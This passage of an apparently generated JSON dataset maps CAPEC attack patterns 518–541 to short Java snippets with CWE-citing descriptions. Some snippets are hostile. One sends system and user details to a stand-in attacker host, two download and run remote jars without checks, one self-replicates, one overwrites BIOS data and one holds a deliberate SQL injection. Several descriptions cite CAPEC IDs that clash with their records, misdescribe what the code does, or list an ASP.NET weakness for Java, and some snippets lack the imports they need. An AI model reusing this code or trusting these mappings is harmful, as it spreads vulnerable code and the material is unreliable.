        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class DocumentationAlteration {\n    private static final String DOCUMENT_PATH = \"path/to/documentation.txt\";\n    private static final String ALTERED_DOCUMENT_PATH = \"path/to/altered_documentation.txt\";\n\n    public static void main(String[] args) {\n        try {\n            // Read the original documentation\n            String content = new String(Files.readAllBytes(Paths.get(DOCUMENT_PATH)));\n\n            // Alter the documentation to circumvent dial-down functionality\n            String alteredContent = content.replaceAll(\"restricted_technology\", \"allowed_technology\");\n\n            // Write the altered documentation to a new file\n            FileWriter writer = new FileWriter(new File(ALTERED_DOCUMENT_PATH));\n            writer.write(alteredContent);\n            writer.close();\n\n            System.out.println(\"Documentation altered successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Documentation Alteration to Circumvent Dial-down' as described in the CAPEC. The code reads a manufacturer's documentation file, alters specific content to circumvent restrictions on advanced technology, and writes the altered content to a new file. This represents an attack where an unauthorized actor modifies documentation to change the interpretation of implementation and manufacturing techniques, allowing restricted technologies to be used. The code also touches on related CWEs such as 'Improper Physical Access Control' (CWE-1263) by assuming access to the documentation, 'Insufficient Technical Documentation' (CWE-1059) by potentially exploiting gaps in documentation, and 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) by altering sensitive information."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "import java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SystemConfig {\n    private Properties properties = new Properties();\n\n    public SystemConfig(String configFilePath) {\n        try (FileInputStream fis = new FileInputStream(configFilePath)) {\n            properties.load(fis);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String getSystemCapability(String key) {\n        return properties.getProperty(key, \"default\");\n    }\n\n    public static void main(String[] args) {\n        SystemConfig config = new SystemConfig(\"system.properties\");\n        String capability = config.getSystemCapability(\"maxConnections\");\n        System.out.println(\"System Max Connections: \" + capability);\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to the CAPEC 'Documentation Alteration to Produce Under-performing Systems'. The code reads system configuration from a properties file, which could be altered by an attacker with access to the documentation or configuration files. The 'SystemConfig' class loads properties from a file, and the 'getSystemCapability' method retrieves specific system capabilities. If an attacker modifies the 'system.properties' file to provide incorrect values, it could lead to under-performing systems. This example also touches on related CWEs: insufficient technical documentation (CWE-1059) if the properties file lacks proper documentation, exposure of sensitive system information (CWE-497) if the properties file is not properly secured, and improper following of specification (CWE-573) if the system relies on incorrect or altered specifications."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "public class VulnerableSystem {\n    // Insufficient Technical Documentation\n    // Missing Documentation for Design\n    // This class is supposed to handle user authentication, but lacks proper documentation.\n    private Map<String, String> userDatabase = new HashMap<>();\n\n    public VulnerableSystem() {\n        // Incorrect Provision of Specified Functionality\n        // The constructor is supposed to initialize the user database, but it is left empty.\n    }\n\n    public boolean authenticate(String username, String password) {\n        // Improper Following of Specification by Caller\n        // The method does not follow the proper authentication protocol.\n        String storedPassword = userDatabase.get(username);\n        return storedPassword != null && storedPassword.equals(password);\n    }\n\n    public void addUser(String username, String password) {\n        // Improper Control of Dynamically-Managed Code Resources\n        // No checks are performed to ensure the username is unique.\n        userDatabase.put(username, password);\n    }\n}",
        "description": "This Java code snippet represents a vulnerable system where an attacker has altered the documentation and design process to introduce errors. The class `VulnerableSystem` is intended to handle user authentication but lacks sufficient technical documentation and design documentation (CWE-1059, CWE-1053). The constructor does not initialize the user database as specified (CWE-684). The `authenticate` method does not follow proper authentication protocols (CWE-573), and the `addUser` method does not properly control dynamically-managed code resources, allowing overwriting of existing users without checks (CWE-913). This embodies the CAPEC idea of altering documentation to cause system design errors, leading to exploitable weaknesses."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "public class Main {\n    public static void main(String[] args) {\n        // Simulate the use of a counterfeit hardware component\n        HardwareComponent component = new CounterfeitComponent();\n        component.performOperation();\n    }\n}\n\nclass HardwareComponent {\n    public void performOperation() {\n        System.out.println(\"Performing safe operation...\");\n    }\n}\n\nclass CounterfeitComponent extends HardwareComponent {\n    @Override\n    public void performOperation() {\n        // Malicious behavior embedded in counterfeit component\n        System.out.println(\"Performing malicious operation...\");\n        // Undocumented feature that can be exploited\n        undocumentedFeature();\n    }\n\n    private void undocumentedFeature() {\n        System.out.println(\"Executing undocumented feature...\");\n        // Potentially harmful code\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of a counterfeit hardware component being inserted during product assembly. The `CounterfeitComponent` class extends the `HardwareComponent` class and overrides the `performOperation` method to include malicious behavior. This represents CWE-506 (Embedded Malicious Code) and CWE-1242 (Inclusion of Undocumented Features or Chicken Bits). The counterfeit component performs a malicious operation and includes an undocumented feature that could be exploited, embodying the main idea of CAPEC-442 (Counterfeit Hardware Component Inserted During Product Assembly)."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "public class HardwareConfig {\n    private int registerDefault = 0x00; // CWE-1221: Incorrect Register Defaults\n    private boolean lockBit = false; // CWE-1231: Improper Prevention of Lock Bit Modification\n\n    public void setRegisterDefault(int value) {\n        // CWE-657: Violation of Secure Design Principles\n        this.registerDefault = value; // Insecure: allows arbitrary modification\n    }\n\n    public void setLockBit(boolean value) {\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        this.lockBit = value; // Insecure: allows lock bit modification\n    }\n\n    public void debugComponentChain() {\n        // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n        System.out.println(\"Debugging component chain...\"); // Insecure: insufficient granularity\n    }\n\n    public static void main(String[] args) {\n        HardwareConfig config = new HardwareConfig();\n        config.setRegisterDefault(0xFF); // Altering register default to insecure value\n        config.setLockBit(true); // Modifying lock bit after it has been set\n        config.debugComponentChain(); // Debugging with incorrect granularity\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a hardware configuration class that embodies the main idea of the CAPEC 'Hardware Design Specifications Are Altered'. The code includes several vulnerabilities related to the CWEs mentioned:\n\n1. **CWE-1221: Incorrect Register Defaults** - The `registerDefault` is set to an insecure value without proper validation.\n2. **CWE-1231: Improper Prevention of Lock Bit Modification** - The `lockBit` can be modified after it has been set, which should be prevented.\n3. **CWE-657: Violation of Secure Design Principles** - The method `setRegisterDefault` allows arbitrary modification of register defaults, violating secure design principles.\n4. **CWE-1296: Incorrect Chaining or Granularity of Debug Components** - The `debugComponentChain` method demonstrates insufficient granularity in debugging components.\n\nThe code snippet illustrates how an attacker with access to the hardware design specifications could introduce flaws advantageous to them once the system is deployed."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "public class HardwareComponent {\n    private static final String COMPONENT_VERSION = \"1.0\";\n    private boolean isTampered;\n\n    public HardwareComponent() {\n        // Simulate a tampered hardware component\n        this.isTampered = true; // CWE-506: Embedded Malicious Code\n    }\n\n    public void performCriticalOperation() {\n        if (isTampered) {\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            System.out.println(\"Error: Hardware component is tampered. Critical operation failed.\");\n            return;\n        }\n        System.out.println(\"Critical operation performed successfully.\");\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent component = new HardwareComponent();\n        // CWE-1329: Reliance on Component That is Not Updateable\n        if (COMPONENT_VERSION.equals(\"1.0\")) {\n            System.out.println(\"Warning: Using an outdated hardware component version.\");\n        }\n        component.performCriticalOperation();\n    }\n}",
        "description": "This Java code snippet represents a scenario where a hardware component is tampered with, embodying the main idea of CAPEC-452: Malicious Hardware Component Replacement. The `HardwareComponent` class simulates a tampered hardware component (CWE-506: Embedded Malicious Code). The `performCriticalOperation` method checks if the component is tampered and injects an error if it is (CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy). The `main` method warns about using an outdated hardware component version (CWE-1329: Reliance on Component That is Not Updateable). This code demonstrates the potential risks and vulnerabilities associated with using tampered or outdated hardware components in a system."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousSoftware {\n    public static void main(String[] args) {\n        try {\n            // CWE-1395: Dependency on Vulnerable Third-Party Component\n            URL url = new URL(\"http://example.com/vulnerable-component.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"vulnerable-component.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"java -jar vulnerable-component.jar\");\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            replicateMaliciousCode();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void replicateMaliciousCode() {\n        try {\n            // Simulate replication by copying itself to another location\n            Files.copy(Paths.get(\"MaliciousSoftware.class\"), Paths.get(\"/tmp/MaliciousSoftware.class\"), StandardCopyOption.REPLACE_EXISTING);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of implanting malicious software into a system, as described in the CAPEC. The code downloads a vulnerable third-party component (CWE-1395) and executes it, potentially embedding malicious code (CWE-506). Additionally, it includes a method to replicate itself, simulating a virus or worm (CWE-509). The main idea is to show how an attacker can implant and propagate malicious software within a system, leveraging vulnerabilities in third-party components."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class RogueIntegration {\n    public static void main(String[] args) {\n        String url = \"jdbc:mysql://localhost:3306/mydatabase\";\n        String user = \"root\";\n        String password = \"password\";\n        String query = \"SELECT * FROM users WHERE username = '\" + args[0] + \"'\";\n\n        try {\n            // Establishing a connection to the database\n            Connection conn = DriverManager.getConnection(url, user, password);\n            Statement stmt = conn.createStatement();\n\n            // Executing the query\n            ResultSet rs = stmt.executeQuery(query);\n\n            // Processing the result set\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n\n            // Closing the connection\n            conn.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Maliciously altered component\n    public static void maliciousComponent() {\n        // This method represents a rogue process that could be injected\n        System.out.println(\"Executing malicious component...\");\n        // Potentially harmful code here\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker could alter or establish rogue processes in an integration facility to insert maliciously altered components into the system. The main function connects to a database and executes an SQL query using user input without proper sanitization, making it vulnerable to SQL Injection (CWE-89). Additionally, the `maliciousComponent` method represents a rogue process that could be injected into the system, embodying the idea of Embedded Malicious Code (CWE-506) and Inclusion of Functionality from Untrusted Control Sphere (CWE-829). This code snippet highlights the potential for malicious disruption or additional compromise when the system is deployed, aligning with the CAPEC description."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\nimport java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\nimport java.io.StringReader;\n\npublic class XMLFloodExample {\n    public static void main(String[] args) {\n        String xmlPayload = \"<root>\";\n        for (int i = 0; i < 10000; i++) {\n            xmlPayload += \"<element>data</element>\";\n        }\n        xmlPayload += \"</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            builder.parse(new InputSource(new StringReader(xmlPayload)));\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an XML Flood attack. The code constructs a large XML payload by repeatedly appending XML elements in a loop. The resulting XML string is then parsed by the DocumentBuilder, which can lead to a Denial of Service (DoS) if the payload is large enough. This example highlights the vulnerability described in CAPEC-230 (XML Flood) and related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-112 (Missing XML Validation). The code does not include any resource allocation limits or XML validation, making it susceptible to such attacks."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class MalwareRecon {\n    public static void main(String[] args) {\n        try {\n            // Gather system information\n            String os = System.getProperty(\"os.name\");\n            String user = System.getProperty(\"user.name\");\n            String javaVersion = System.getProperty(\"java.version\");\n\n            // Send gathered information to an external server\n            String data = \"os=\" + os + \"&user=\" + user + \"&javaVersion=\" + javaVersion;\n            URL url = new URL(\"http://malicious-server.com/collect?\" + data);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            // Print response from the server\n            System.out.println(response.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of malware-directed internal reconnaissance. The code gathers sensitive system information such as the operating system name, the username, and the Java version. It then sends this information to an external server controlled by an attacker. This embodies the CAPEC concept of using malware to gather information about a system's configuration and security mechanisms. The code also touches on related CWEs: it exposes sensitive system information (CWE-497), contains potentially malicious code (CWE-506), and could be part of a larger spyware application (CWE-512)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ComponentManager {\n    private Map<String, String> components = new HashMap<>();\n\n    public void addComponent(String name, String version) {\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        if (isVulnerableComponent(name, version)) {\n            System.out.println(\"Warning: Adding a vulnerable component!\");\n        }\n        components.put(name, version);\n    }\n\n    public void integrateComponent(String name) {\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        if (!isTrustedComponent(name)) {\n            System.out.println(\"Error: Attempting to integrate an untrusted component!\");\n            return;\n        }\n        // CWE-506: Embedded Malicious Code\n        if (containsMaliciousCode(name)) {\n            System.out.println(\"Error: Component contains malicious code!\");\n            return;\n        }\n        System.out.println(\"Component \" + name + \" integrated successfully.\");\n    }\n\n    private boolean isVulnerableComponent(String name, String version) {\n        // Simulate a check for known vulnerabilities\n        return \"vulnerableComponent\".equals(name) && \"1.0\".equals(version);\n    }\n\n    private boolean isTrustedComponent(String name) {\n        // Simulate a trust check\n        return !\"untrustedComponent\".equals(name);\n    }\n\n    private boolean containsMaliciousCode(String name) {\n        // Simulate a check for malicious code\n        return \"maliciousComponent\".equals(name);\n    }\n\n    public static void main(String[] args) {\n        ComponentManager manager = new ComponentManager();\n        manager.addComponent(\"vulnerableComponent\", \"1.0\");\n        manager.integrateComponent(\"untrustedComponent\");\n        manager.integrateComponent(\"maliciousComponent\");\n        manager.integrateComponent(\"trustedComponent\");\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a component management system that embodies the main idea of CAPEC-453: 'Provide Counterfeit Component'. The code includes checks for vulnerabilities (CWE-1395), trustworthiness (CWE-1357), and malicious code (CWE-506) when adding and integrating components. The `addComponent` method warns if a vulnerable component is added, while the `integrateComponent` method prevents the integration of untrusted or malicious components. This demonstrates how an attacker could exploit the procurement process by introducing counterfeit components that could disrupt or compromise the system."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class HardwareComponent {\n    private static final Map<String, String> approvedComponents = new HashMap<>();\n    private String componentId;\n    private String firmwareVersion;\n\n    static {\n        // Approved components with their firmware versions\n        approvedComponents.put(\"componentA\", \"v1.0\");\n        approvedComponents.put(\"componentB\", \"v2.1\");\n    }\n\n    public HardwareComponent(String componentId, String firmwareVersion) {\n        this.componentId = componentId;\n        this.firmwareVersion = firmwareVersion;\n    }\n\n    public boolean isApproved() {\n        String approvedVersion = approvedComponents.get(componentId);\n        return approvedVersion != null && approvedVersion.equals(firmwareVersion);\n    }\n\n    public static void main(String[] args) {\n        // Simulating substitution of a hardware component\n        HardwareComponent maliciousComponent = new HardwareComponent(\"componentA\", \"v1.1\");\n\n        if (!maliciousComponent.isApproved()) {\n            System.out.println(\"Warning: Unapproved hardware component detected!\");\n            // Potentially malicious code execution\n            executeMaliciousCode();\n        }\n    }\n\n    private static void executeMaliciousCode() {\n        // Simulated malicious behavior\n        System.out.println(\"Executing malicious code...\");\n        // Example of embedded malicious code\n        // This could be anything from data exfiltration to system disruption\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker substitutes an approved hardware component with a maliciously-altered one. The `HardwareComponent` class maintains a list of approved components and their firmware versions. The `isApproved` method checks if the component is approved based on its ID and firmware version. In the `main` method, a malicious component is instantiated with an unapproved firmware version. If the component is not approved, a warning is printed, and a method simulating malicious behavior is executed. This represents the CAPEC of 'Hardware Component Substitution' and incorporates related CWEs such as reliance on non-updateable components, improper restriction of software interfaces, and embedded malicious code."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class MaliciousBIOSUpdater {\n    private static final String BIOS_PATH = \"/path/to/bios.bin\";\n    private static final String MALICIOUS_BIOS_PATH = \"/path/to/malicious_bios.bin\";\n\n    public static void main(String[] args) {\n        try {\n            // Read the original BIOS file\n            byte[] biosData = Files.readAllBytes(Paths.get(BIOS_PATH));\n\n            // Inject malicious code (simulated by replacing the BIOS with a malicious one)\n            byte[] maliciousBiosData = Files.readAllBytes(Paths.get(MALICIOUS_BIOS_PATH));\n\n            // Write the malicious BIOS data back to the BIOS file\n            try (FileOutputStream fos = new FileOutputStream(new File(BIOS_PATH))) {\n                fos.write(maliciousBiosData);\n            }\n\n            System.out.println(\"BIOS update completed successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an attack where a maliciously altered BIOS is installed on a system. The code reads the original BIOS file, replaces its content with a malicious BIOS file, and writes the malicious data back to the BIOS file. This represents the CAPEC 'Altered Installed BIOS' by showing how an attacker with access to the system software can replace the BIOS with a malicious version. The code also touches on related CWEs: it assumes the BIOS is not updateable (CWE-1277), lacks granular access control (CWE-1220), and contains embedded malicious code (CWE-506). The code does not handle lock bit modification (CWE-1231) or reliance on non-updateable components (CWE-1329) directly but implies these weaknesses by the ease of BIOS replacement."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-506: Embedded Malicious Code\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a software update is downloaded and executed without verifying its integrity, embodying the main idea of the CAPEC 'Malicious Manual Software Update'. The code downloads an update from a potentially malicious URL (CWE-494: Download of Code Without Integrity Check) and then executes it (CWE-506: Embedded Malicious Code). This represents a common attack vector where an attacker can introduce malicious code into a system by tricking the user into downloading and running a compromised update."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "public class HardwareUpdate {\n    private static final String FIRMWARE_VERSION = \"1.0.0\";\n    private static boolean isFirmwareUpdateable = false;\n\n    public static void main(String[] args) {\n        // Simulate hardware update\n        if (isFirmwareUpdateable) {\n            updateFirmware(\"2.0.0\");\n        } else {\n            System.out.println(\"Firmware is not updateable. Proceeding with existing version: \" + FIRMWARE_VERSION);\n        }\n\n        // Simulate malicious hardware replacement\n        if (replaceHardwareComponent(\"maliciousComponent\")) {\n            System.out.println(\"Hardware component replaced successfully.\");\n        } else {\n            System.out.println(\"Failed to replace hardware component.\");\n        }\n    }\n\n    private static void updateFirmware(String newVersion) {\n        // Simulate firmware update process\n        System.out.println(\"Updating firmware to version: \" + newVersion);\n        // Potentially malicious code could be injected here\n    }\n\n    private static boolean replaceHardwareComponent(String componentName) {\n        // Simulate hardware replacement process\n        if (componentName.equals(\"maliciousComponent\")) {\n            // Simulate embedded malicious code\n            System.out.println(\"Warning: Malicious component detected!\");\n            return false;\n        }\n        return true;\n    }\n}",
        "description": "This Java code snippet simulates a hardware update and replacement process, embodying the main idea of the CAPEC 'Malicious Hardware Update'. The code includes a firmware update mechanism that is not updateable (CWE-1277), and a hardware replacement function that can introduce a malicious component (CWE-506). The `isFirmwareUpdateable` flag is set to false, indicating reliance on a non-updateable component (CWE-1329). The `replaceHardwareComponent` method checks for a 'maliciousComponent', simulating the introduction of malicious hardware. This represents the risk of an adversary tricking the replacement of a good component with a malicious one, leading to potential system compromise."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "public class MaliciousGrayMarketHardware {\n    private static final String MALICIOUS_CODE = \"System.out.println('Malicious code executed');\";\n    private static final String HARDWARE_COMPONENT = \"VulnerableComponent\";\n\n    public static void main(String[] args) {\n        if (isGrayMarketHardware(HARDWARE_COMPONENT)) {\n            executeMaliciousCode();\n        } else {\n            System.out.println(\"Hardware is safe.\");\n        }\n    }\n\n    private static boolean isGrayMarketHardware(String component) {\n        // Simulate checking if the hardware component is from the gray market\n        return \"VulnerableComponent\".equals(component);\n    }\n\n    private static void executeMaliciousCode() {\n        // Simulate executing malicious code embedded in the hardware\n        System.out.println(MALICIOUS_CODE);\n    }\n}",
        "description": "This Java code snippet simulates a scenario where a hardware component from the gray market contains embedded malicious code. The `isGrayMarketHardware` method checks if the hardware component is from the gray market. If it is, the `executeMaliciousCode` method is called, which simulates the execution of malicious code. This represents the CAPEC idea of maliciously altered hardware components being sold on the gray market, leading to potential victim disruption and compromise. The code also touches on related CWEs such as embedded malicious code (CWE-506) and reliance on insufficiently trustworthy components (CWE-1357)."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class ConfigInjector {\n    public static void main(String[] args) {\n        String configFilePath = \"/tmp/config.txt\";\n        String maliciousData = \"malicious=true\";\n\n        try {\n            // CWE-377: Insecure Temporary File\n            File configFile = new File(configFilePath);\n            if (!configFile.exists()) {\n                configFile.createNewFile();\n            }\n\n            // CWE-284: Improper Access Control\n            if (configFile.setReadable(true, false) && configFile.setWritable(true, false)) {\n                // CWE-99: Improper Control of Resource Identifiers\n                Files.write(Paths.get(configFilePath), maliciousData.getBytes(), StandardOpenOption.APPEND);\n            }\n\n            // Simulate reading the configuration file during system initialization\n            BufferedReader reader = new BufferedReader(new FileReader(configFilePath));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                // CWE-201: Insertion of Sensitive Information Into Sent Data\n                System.out.println(\"Config: \" + line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can inject malicious data into a configuration file during system initialization. The code creates or opens a temporary configuration file (CWE-377) and sets improper access controls (CWE-284) to make it readable and writable by any user. It then appends malicious data to the configuration file (CWE-99). During system initialization, the configuration file is read, and its contents, including the malicious data, are printed out, potentially exposing sensitive information (CWE-201). This represents the CAPEC scenario where an attacker injects malicious data into critical operational data during configuration, causing the system to perform in a suboptimal manner that benefits the adversary."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "public class HardwareComponent {\n    private String firmwareVersion = \"1.0.0\";\n    private boolean isUpdateable = false;\n    private String confidentialData = \"Sensitive Info\";\n\n    public void updateFirmware(String newFirmware) {\n        if (isUpdateable) {\n            firmwareVersion = newFirmware;\n        } else {\n            System.out.println(\"Firmware update not supported.\");\n        }\n    }\n\n    public void performOperation() {\n        // Malicious code insertion\n        if (firmwareVersion.equals(\"1.0.0\")) {\n            System.out.println(\"Performing malicious operation...\");\n            // Exposing sensitive information\n            System.out.println(\"Confidential Data: \" + confidentialData);\n        } else {\n            System.out.println(\"Performing normal operation...\");\n        }\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent component = new HardwareComponent();\n        component.performOperation();\n    }\n}",
        "description": "This Java code snippet represents a hardware component with a firmware version that cannot be updated (CWE-1329). The `performOperation` method contains embedded malicious code (CWE-506) that executes if the firmware version is '1.0.0'. This malicious code exposes sensitive information (CWE-497) stored in the `confidentialData` variable. The code demonstrates how an adversary could infiltrate a hardware development environment to insert malicious software, aligning with the CAPEC description."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-library.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious-library.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious-library.jar\");\n            pb.start();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable downloader that embodies the main idea of CAPEC-442: Open-Source Library Manipulation. The code downloads a JAR file from a remote URL without verifying its integrity (CWE-494). It then executes the downloaded JAR file, which could contain malicious code (CWE-829). This represents the risk of including functionality from an untrusted source, potentially leading to the execution of embedded malicious code (CWE-506) or replicating malicious code (CWE-509). The code highlights the dangers of relying on third-party components without proper security checks (CWE-1395)."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "public class MaliciousASIC {\n    private static final String SECRET_KEY = \"hardcoded_secret_key\";\n    private static final boolean DEBUG_MODE = true;\n\n    public static void main(String[] args) {\n        if (DEBUG_MODE) {\n            System.out.println(\"Debug Mode is ON. Sensitive information might be exposed.\");\n        }\n        // Malicious functionality: Exposing sensitive system information\n        System.out.println(\"System Secret Key: \" + SECRET_KEY);\n    }\n\n    // Insecure Security Identifier Mechanism\n    public boolean isAuthorized(String securityIdentifier) {\n        // Improperly implemented security check\n        return securityIdentifier.equals(\"trusted_identifier\");\n    }\n\n    // Improper Restriction of Security Token Assignment\n    public void assignSecurityToken(String user, String token) {\n        // Maliciously assigning a high-privilege token to any user\n        System.out.println(\"Assigning high-privilege token to user: \" + user);\n    }\n}",
        "description": "This Java code snippet represents the concept of an ASIC with malicious functionality. The code includes several vulnerabilities: \n1. **Embedded Malicious Code (CWE-506)**: The code contains hardcoded sensitive information (`SECRET_KEY`) and exposes it when run.\n2. **Exposure of Sensitive System Information (CWE-497)**: The `DEBUG_MODE` flag is set to true, which prints sensitive information to the console.\n3. **ASP.NET Misconfiguration (CWE-11)**: Debugging messages are enabled, which can help attackers learn about the system.\n4. **Insecure Security Identifier Mechanism (CWE-1294)**: The `isAuthorized` method contains an insecure check for security identifiers.\n5. **Improper Restriction of Security Token Assignment (CWE-1259)**: The `assignSecurityToken` method assigns high-privilege tokens without proper validation.\n\nThe code demonstrates how an attacker with access to the development environment of an ASIC can insert malicious functionality to expose sensitive information and compromise the system's security mechanisms."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "public class BufferOverreadExample {\n    public static void main(String[] args) {\n        String[] data = {\"one\", \"two\", \"three\"};\n        int index = 4; // Out-of-bounds index\n        try {\n            // Attempt to read beyond the buffer's boundary\n            String value = data[index];\n            System.out.println(\"Value: \" + value);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Caught an exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an 'Overread Buffers' vulnerability, specifically an 'Out-of-bounds Read' (CWE-125). The code attempts to access an element of the 'data' array using an index that is outside the valid range of the array (index 4, while the array has only 3 elements). This results in an ArrayIndexOutOfBoundsException, which is caught and handled in the catch block. The code represents the main idea of CAPEC-129 by showing how an adversary could exploit such a vulnerability to cause a program to read beyond the intended buffer, potentially leading to exposure of sensitive information, system crashes, or other unintended behavior."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
